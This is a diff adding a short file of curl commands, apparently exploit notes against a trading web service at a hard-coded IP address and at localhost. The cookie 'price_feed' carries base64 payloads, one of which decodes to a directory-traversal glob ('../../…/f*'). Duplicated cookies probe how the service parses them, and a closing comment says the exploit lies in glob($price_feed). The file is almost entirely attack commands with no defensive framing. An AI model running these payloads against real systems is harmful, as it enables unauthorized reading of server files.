@@ -1,0 +1,25 @@
+curl 'http://207.180.200.166:9090/trade' \
+  -H 'Cookie: price_feed=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZio=' \
+  --insecure -vvv
+
+curl http://207.180.200.166:9090/trade \
+    -H 'Cookie: price_feed=REFJ' \
+    -H 'Cookie: price_feed=FJ' \
+    -vvv
+
+curl http://207.180.200.166:9090/trade \
+    -H 'Cookie: price_feed=; price_feed=UE9QQ09JTlM=' \
+    -H 'Cookie: price_feed=; price_feed=REFJ' \
+    -vvv
+
+curl localhost \
+    -H 'Cookie: price_feed=REFJ' \
+    -H 'Cookie: price_feed=; price_feed=REFJ' \
+    -vvv
+
+curl 'http://127.0.0.1:5000/' \
+  -H 'Cookie: price_feed=UE9QQ09JTlM=' \
+  -H 'Cookie: price_feed=UE9QQ09JTlM=' \
+  --insecure -vvv
+
+# the exploit is on glob($price_feed)
